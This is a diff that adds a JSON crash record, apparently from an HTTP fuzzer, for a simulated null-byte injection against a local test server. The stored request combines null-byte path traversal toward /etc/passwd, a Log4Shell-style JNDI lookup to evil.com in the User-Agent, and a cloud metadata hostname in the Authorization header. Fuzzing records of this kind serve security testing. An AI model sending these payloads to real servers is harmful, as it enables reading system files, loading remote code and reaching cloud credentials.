@@ -1,0 +1,21 @@
+{
+  "timestamp": "2025-12-29T14:42:15.433373",
+  "crash_type": "null_byte_injection",
+  "payload": "HEAD /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Authorization': 'http://metadata.google.internal'}",
+  "payload_hash": "9b47ca1c476e5aa2",
+  "request_method": "HEAD",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Authorization": "http://metadata.google.internal"
+  },
+  "request_body": "",
+  "error_message": "Simulated null_byte_injection",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 375
+}
